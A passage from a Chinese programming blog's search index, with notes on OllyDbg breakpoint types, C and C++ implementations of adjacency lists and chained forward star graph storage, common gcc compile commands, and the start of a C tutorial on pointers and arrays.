调试寄存器组状态寄存器.</li><li>DR7: 调试寄存器组控制寄存器.</li></ul><p>所以最多可以设置4个硬件断点.</p><h2 id="内存断点">内存断点</h2><p>原理是将指定地址赋予不可访问/不可写属性来引发异常,OD截取该异常后检查是否为断点地址,如果是则进行中断.</p><h2 id="消息断点">消息断点</h2><p>Windows本身是消息驱动的,可以尝试使用消息断点,使用<code>W按钮</code>打开窗口信息,选择需要的条目(例如&quot;Button&quot;),然后在弹出界面的菜单中选择需要的消息即可.</p><h2 id="条件断点">条件断点</h2><p>可以使用一些条件来设置断点,例如寄存器条件,存储器条件</p><h1 id="插件使用">插件使用</h1><h2 id="cmdbar">CmdBar</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240313004936313.png" alt="image-20240313004936313" style="zoom:50%;" /><p>常用指令如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240313004959547.png" alt="image-20240313004959547" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> OD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>邻接表</title>
      <link href="/2023037405f015f3/"/>
      <url>/2023037405f015f3/</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><ol><li><p>链表</p></li><li><p>指针数组</p></li></ol><h1 id="概述">概述</h1><p>邻接表本质上是一个二维链表(线性表)</p><p>邻接表存储了与每一个顶点相邻的边集的集合.换句话说,邻接表由若干个链表组成,每个链表都对应图中一个顶点,存储以该顶点为起点的边集.</p><p>其中每一个链表就称为该顶点的<code>邻接表</code>,所有的这些链表共同组成这个图的邻接表.</p><p>例如对该图建立邻接表:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231229213940793.png" alt="image-20231229213940793" style="zoom:50%;" /><p>左边为一个指针数组,存储每个链表的头指针(即第一个结点的指针),右边则为对应的邻接表,存储各个边:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231229213925777.png" alt="image-20231229213925777" style="zoom:50%;" /><p>以顶点A为例,&lt;A,B,3&gt;为其第一条出边,&lt;A,C,1&gt;为第二条出边,这2条边作为2个表项组成A的邻接表(链表).</p><p>所以邻接表是用来存储每个节点的<code>出边</code>集合的数据结构.</p><p>另外,由于树也是一种特殊的图(没有回路的图),因此邻接表也可以用于存储树.</p><h1 id="优缺点">优缺点</h1><p>优点:</p><ol><li><p>节省空间</p><p>与一般的邻接矩阵相比较而言,邻接表更节省空间.</p><p>邻接表只关注存在的边,忽略了邻接矩阵中不存在的边(为0的元素),空间复杂度为<code>O(n+m)</code>,n,m分别为顶点数和边数,即需要一个长度为<code>n</code>的表头,所有的链表共有<code>m</code>个结点存储<code>m</code>条边.</p><p>因此,邻接表很适合存储<code>稀疏图</code>.</p></li><li><p>方便遍历某个顶点的所有邻接点—出边</p><p>因此很适合作为求解<code>单源最短路径</code>等问题的存储结构.</p></li></ol><p>缺点</p><ol><li><p>确定2点间的边信息需要遍历2个链表.</p></li><li><p>存向图时,删除一条边需要从2个链表中进行2次删除.</p></li><li><p>当需要了解某个顶点的入度时,比如拓扑排序,需要遍历整个邻接表.—当然也有解决办法,那就是逆邻接表–存储每个节点的入边的集合.</p><p>或者使用十字链表来同时存储图的入度和出度信息.</p></li></ol><h1 id="代码实现">代码实现</h1><p>使用C语言实现邻接表的ADT.</p><p><code>AdjacencyList.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ADJACENCYLIST_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADJACENCYLIST_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> dest;</span><br><span class="line">    <span class="type">int</span> weight; <span class="comment">// The weight is of type int</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GraphAdjList</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> vertexNum;</span><br><span class="line">    <span class="type">int</span> edgeNum;</span><br><span class="line">    <span class="type">int</span> isWeighted; <span class="comment">// 0 for unweighted graph, 1 for weighted graph</span></span><br><span class="line">    EdgeNode **adjLists;</span><br><span class="line">&#125; GraphAdjList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a graph with n vertices</span></span><br><span class="line">GraphAdjList *<span class="title function_">createGraphAdjList</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> isWeighted)</span>;</span><br><span class="line"><span class="comment">// Destroy a graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">destroyGraphAdjList</span><span class="params">(GraphAdjList *graph)</span>;</span><br><span class="line"><span class="comment">// Add an edge to the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">addEdgeAdjList</span><span class="params">(GraphAdjList *graph, <span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> w)</span>;</span><br><span class="line"><span class="comment">// Remove an edge from the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">removeEdgeAdjList</span><span class="params">(GraphAdjList *graph, <span class="type">int</span> u, <span class="type">int</span> v)</span>;</span><br><span class="line"><span class="comment">// Print the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printGraphAdjList</span><span class="params">(GraphAdjList *graph)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ADJACENCYLIST_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>AdjacencyList.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AdjacencyList.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a graph with n vertices and m edges</span></span><br><span class="line">GraphAdjList *<span class="title function_">createGraphAdjList</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> isWeighted)</span> &#123;</span><br><span class="line">    GraphAdjList *graph = (GraphAdjList *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphAdjList));</span><br><span class="line">    graph-&gt;vertexNum = n;</span><br><span class="line">    graph-&gt;edgeNum = <span class="number">0</span>;</span><br><span class="line">    graph-&gt;isWeighted = isWeighted;</span><br><span class="line">    graph-&gt;adjLists = (EdgeNode **) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode *) * (n + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; ++i)</span><br><span class="line">        graph-&gt;adjLists[i] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> graph;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Destroy a graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">destroyGraphAdjList</span><span class="params">(GraphAdjList *graph)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;vertexNum; ++i) &#123;</span><br><span class="line">        EdgeNode *p = graph-&gt;adjLists[i];</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            EdgeNode *q = p;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(graph-&gt;adjLists);</span><br><span class="line">    <span class="built_in">free</span>(graph);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add an edge to the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">addEdgeAdjList</span><span class="params">(GraphAdjList *graph, <span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> w)</span> &#123;</span><br><span class="line">    EdgeNode *p = (EdgeNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">    p-&gt;dest = v;</span><br><span class="line">    p-&gt;weight = graph-&gt;isWeighted ? w : <span class="number">1</span>;</span><br><span class="line">    p-&gt;next = graph-&gt;adjLists[u];</span><br><span class="line">    graph-&gt;adjLists[u] = p;</span><br><span class="line">    ++graph-&gt;edgeNum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove an edge from the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">removeEdgeAdjList</span><span class="params">(GraphAdjList *graph, <span class="type">int</span> u, <span class="type">int</span> v)</span> &#123;</span><br><span class="line">    EdgeNode *p = graph-&gt;adjLists[u];</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;dest == v) &#123;</span><br><span class="line">        graph-&gt;adjLists[u] = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        --graph-&gt;edgeNum;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;next-&gt;dest == v) &#123;</span><br><span class="line">            EdgeNode *q = p-&gt;next;</span><br><span class="line">            p-&gt;next = q-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            --graph-&gt;edgeNum;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Print the graph</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printGraphAdjList</span><span class="params">(GraphAdjList *graph)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Vertex number: %d\n&quot;</span>, graph-&gt;vertexNum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Edge number: %d\n&quot;</span>, graph-&gt;edgeNum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Weighted: %s\n&quot;</span>, graph-&gt;isWeighted ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;vertexNum; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: &quot;</span>, i);</span><br><span class="line">        EdgeNode *p = graph-&gt;adjLists[i];</span><br><span class="line">        <span class="keyword">if</span>(p == <span class="literal">NULL</span>) <span class="built_in">putchar</span>(<span class="string">&#x27;^&#x27;</span>);</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, p-&gt;dest);</span><br><span class="line">            <span class="keyword">if</span> (graph-&gt;isWeighted)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;(%d)&quot;</span>, p-&gt;weight);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>test.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This code is used to test functionality.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AdjacencyList.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m); <span class="comment">// 输入图的顶点数和弧(有向边)数</span></span><br><span class="line">    GraphAdjList *graph = createGraphAdjList(n, <span class="number">1</span>); <span class="comment">// 初始化为n个顶点的带权图</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> u, v, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;u, &amp;v, &amp;w);</span><br><span class="line">        addEdgeAdjList(graph, u, v, w); <span class="comment">// 添加一条弧</span></span><br><span class="line">    &#125;</span><br><span class="line">    printGraphAdjList(graph); <span class="comment">// 输出邻接表</span></span><br><span class="line">    destroyGraphAdjList(graph); <span class="comment">// 销毁邻接表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;path&gt;\ADT_AdjacencyList.exe</span><br><span class="line">6 7</span><br><span class="line">1 2 7</span><br><span class="line">1 3 1</span><br><span class="line">1 4 2</span><br><span class="line">2 4 2</span><br><span class="line">3 6 4</span><br><span class="line">4 5 8</span><br><span class="line">5 6 2</span><br><span class="line">Vertex number: 6</span><br><span class="line">Edge number: 7</span><br><span class="line">Weighted: Yes</span><br><span class="line">1: 4(2) 3(1) 2(7)</span><br><span class="line">2: 4(2)</span><br><span class="line">3: 6(4)</span><br><span class="line">4: 5(8)</span><br><span class="line">5: 6(2)</span><br><span class="line">6: ^</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链式前向星</title>
      <link href="/2023cc4b5873e3f1/"/>
      <url>/2023cc4b5873e3f1/</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><ol><li>静态链表</li><li>邻接表(最好了解原理)</li></ol><h1 id="概述">概述</h1><p>与<code>前向星</code>不同,<code>链式前向星</code>无需排序操作,效率相对较高.</p><p>链式前向星实际就是静态建立的<code>邻接表</code>,或者说是用数组模拟(静态链表)实现的邻接表,因此代码实现非常简单.</p><p>链式前向星兼顾了前向星的简便和邻接表的高效,尽管应用不广泛,但是在OI竞赛中备受青睐.</p><h1 id="原理">原理</h1><h2 id="存储结构">存储结构</h2><p>需要2个数组,<code>int head[];</code>和<code>struct Edge edge[];</code>,分别存储表头和所有的边.</p><p>由于链式前向星本质是静态链表,因此需要一个<code>edge[]</code>数组来存储图中所有的边,根据输入顺序,edge[i]为输入的第i条边<code>&lt;ui,vi,wi&gt;</code>.</p><p>对每一条边而言,都存储4个数据<code>u,v,w,next</code>,分别为这条边的<code>起点,终点,权值,下一条边的下标(edge中)</code>.其中<code>下一条边的下标</code>就类似于邻接表中的<code>指向下一条边的指针</code>,只不过这里使用静态链表实现.</p><p>然后,和邻接表一样,需要一个数组<code>head[]</code>作为表头,其中<code>head[i]</code>为一个下标,指向以i为起点的第1条出边.当没有这样的一条边时,即顶点i的出度为0,<code>head[i]</code>可以赋值为-1,代表没有下一条边了,类似NULL指针.</p><h2 id="初始化">初始化</h2><p>输入n,m为图的点数,边数.head[]长度为n,edge[]长度为m.根据实现可多出1个空间以忽略0下标.</p><p><code>head[]</code>全部初始化为-1,代表当前所有的顶点都没有出边,即目前为空图.</p><h2 id="插入边">插入边</h2><p>采用头插法进行插入,每个head[i]就是一个(静态的)链表.</p><p>读入第i条边的信息<code>&lt;ui,vi,wi&gt;</code>,到<code>edge[i]</code>.</p><p>根据ui找到head[ui],即以ui为起点的边集链表,将第一条边的下标<code>head[ui]</code>赋值给<code>edge[i].next</code>,即让第i条边的下一条边指向当前的<code>edge[head[ui]]</code>这条边.当指向的下标为-1时代表着到达链表尾部.</p><p>将<code>i</code>赋值给<code>head[ui]</code>,即头插法,将新增的边i插入到链表头,即后输入的边在链表的头,先输入的边则在尾部,与输入相反.</p><p>依次插入m条边后,链式前向星即建立完成,就是这么简单.</p><h1 id="代码示例">代码示例</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 0x7FFFFFFF</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EDGE</span> &#123;</span></span><br><span class="line"><span class="type">int</span> to, w, next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EDGE</span> <span class="title">edge</span>[500003];</span></span><br><span class="line"><span class="type">int</span> head[<span class="number">100003</span>], n, m, cnt;</span><br><span class="line"><span class="type">void</span> <span class="title function_">addEdge</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> from;</span><br><span class="line">    <span class="comment">// 读入u,v,w</span></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; from;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; edge[++cnt].to;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; edge[cnt].w;</span><br><span class="line">edge[cnt].next = head[from];</span><br><span class="line">head[from] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;输入点数和边数:&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;<span class="comment">//n为点数,m为边数</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;依次输入边(起始 终点 权值):&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)</span><br><span class="line">addEdge(); <span class="comment">// 读入一条边</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = head[i]; j; j = edge[j].next) &#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;--(&quot;</span>&lt;&lt;edge[j].w&lt;&lt;<span class="string">&quot;)--&gt;&quot;</span>&lt;&lt;edge[j].to&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">init();</span><br><span class="line">print();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gcc编译常用命令</title>
      <link href="/2023d7d0d898d653/"/>
      <url>/2023d7d0d898d653/</url>
      
        <content type="html"><![CDATA[<h1 id="gcc编译流程">gcc编译流程</h1><p>预处理-&gt;编译-&gt;汇编-&gt;链接</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231223162315433.png" alt="image-20231223162315433" style="zoom:50%;" /><h1 id="常用编译参数">常用编译参数</h1><table><thead><tr><th>gcc选项</th><th>作用</th></tr></thead><tbody><tr><td>-o</td><td>对<code>.i</code>,<code>.s</code>,<code>.o</code>,<code>可执行文件</code>等生成目标文件</td></tr><tr><td>-E</td><td>只对源程序进行预处理,即只生成<code>.i</code>文件后就停止编译,结果输出到<code>标准输出</code>,需要使用<code>&gt;</code>写入指定文件</td></tr><tr><td>-S</td><td>只生成<code>.s</code>汇编文件后就停止编译</td></tr><tr><td>-c</td><td>只编译源程序,不对编译后产生的目标代码进行链接</td></tr><tr><td>-I</td><td>后跟目录,将该目录加入搜索头文件的目录路径</td></tr><tr><td>-L</td><td>后跟目录,将该目录加入搜索库的目录路径</td></tr><tr><td>-l</td><td>链接lib库</td></tr><tr><td>-g</td><td>在目标文件中嵌入调试信息,以便<code>gdb</code>工具对程序进行调试,及用于生成带有调试信息的程序</td></tr></tbody></table><h1 id="举例">举例</h1><p>仅预处理:</p><p><code>gcc -E main.c &gt; main.i</code></p><br><p>生成汇编代码:</p><p><code>gcc -S main.c</code></p><br><p>仅编译不进行链接:</p><p><code>gcc -c main.s -o main.o</code></p><br><p>使用.o文件生成可执行目标程序</p><p><code>gcc main.o -o main</code></p><p>或者 <code>gcc -o main main.c</code></p><br><p>指定搜索头文件和链接库的目录</p><p><code>gcc -o main main.c -I /home/main/include -L /home/main/lib -lworld</code></p><p><code># -lworld表示在上面的lib路径中寻找libworld.so动态库文件</code></p><p><code># 如果gcc编译选项加入了-static,则表示寻找libworld.a静态库文件</code></p><br><p>单文件编译</p><p>现有 main.c</p><p>编译命令:</p><p><code>gcc main.c -o main</code></p><p><code># 如果为windows平台,则将目标文件改为main.exe即可</code></p><br><p>多文件编译</p><p>现有 main.c hello.c hello.h</p><p>编译命令:</p><p><code>gcc main.c hello.c -o main</code></p><p>或者将.c文件单独编译:</p><p><code>gcc -c hello.c -o hello.o</code></p><p><code>gcc -c main.c -o main.o</code></p><p><code>gcc hello.o main.o -o main</code></p><br><p>参考:<a href="https://zhuanlan.zhihu.com/p/513148985">https://zhuanlan.zhihu.com/p/513148985</a></p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-13_3-初探指针和数组的关系</title>
      <link href="/20237cb717142d36/"/>
      <url>/20237cb717142d36/</url>
      
        <content type="html"><![CDATA[<p>上一篇涉及<code>指针指向的数据类型的大小</code>,有没有一种可能,数组也是一种数据类型,那么一个数组有多大呢?</p><p>前置知识:</p><ol><li>指针类型和指针运算</li><li>一维数组</li><li>sizeof的使用</li></ol><h1 id="数组的大小">数组的大小</h1><p>C语言提供的<code>数组</code>用于存储特定个数的相同类型元素,每个元素都有着相同的大小(占用的字节数),数组作为一个整体,当然也有着其大小,显然,数组的大小==元素的大小*数组元素的个数.</p><p>例如有<code>int a[10];</code>数组的元素为int类型,占用4个字节(<code>sizeof(int)</code>),那么整个数组a就占用40个字节(<code>sizeof(a)</code>):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 使用大括号初始化, 未初始化的元素默认为0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%llu\n&quot;</span>, <span class="keyword">sizeof</span>(a)); <span class="comment">// 40</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为40,说明数组的总长度就是所有元素加起来的总长度.</p><h1 id="使用指针来访问数组">使用指针来访问数组</h1><p>前面已经看到了简单的例子,让一个指针指向数组中的某个元素,并且随着指针的自增/自减,指针的指向按顺序向后或向前移动到相邻的元素.</p><p>我们围绕<code>使用指针访问数组</code>这一话题来编写示例代码.</p><p>那么,如果我们使用一个循环来让指针逐次自增,那么就可以做到访问数组的效果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 